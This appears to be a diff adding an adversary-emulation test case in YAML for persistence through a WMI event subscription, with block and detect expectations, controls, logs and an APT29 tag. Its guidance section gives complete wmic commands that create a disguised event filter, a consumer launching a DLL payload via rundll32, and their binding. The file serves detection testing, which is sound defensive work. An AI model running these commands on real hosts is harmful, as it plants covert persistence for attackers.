@@ -1,0 +1,42 @@
+block:
+- Payload on disk deleted/quarantined by antivirus or other endpoint security tool
+- Suspicious process execution is blocked by EDR or other endpoint security tool
+- Anomalous WMI event filter, consumer, and/or filter to consumer binding creation
+  is blocked by EDR or other endpoint security tool
+controls:
+- SIEM
+- EDR
+- Antivirus
+description: Establish persistence on a target system by creating a WMI CommandlineEventConsumer
+  event subscription that launches a malicious dll payload with rundll32
+detect:
+- Payload on disk triggers an alert in EDR or other endpoint security tool
+- Suspicious process execution is detected by EDR or other endpoint security tool,
+  or alerted in SIEM based on process creation events
+- Anomalous WMI event filter, consumer, and/or filter to consumer binding creation
+  is detected in the SIEM using endpoint security tool telemetry or native windows
+  event ids (ex 5857).
+guidance:
+- cmd> wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="__timeritem",
+  EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent
+  WITHIN 70 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime
+  >= 300 AND TargetInstance.SystemUpTime < 4400"
+- cmd> wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE
+  Name="setpolicytrace", ExecutablePath="C:\Windows\System32\rundll32.exe",CommandLineTemplate="C:\Windows\System32\rundll32.exe
+  {{ dll_payload }} {{ dll_export }}"
+- cmd> wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE
+  Filter="__EventFilter.Name=\"__timeritem\"", Consumer="CommandLineEventConsumer.Name=\"setpolicytrace\""
+logs:
+- winevent:configured
+- edr:telemetry
+metadata:
+  groups:
+  - APT29
+  isv: 1
+  tactic: TA0003
+  tid: T1546.003
+name: Persist via WMI Event Subscription
+platforms:
+- windows
+prerequisites:
+- local_admin
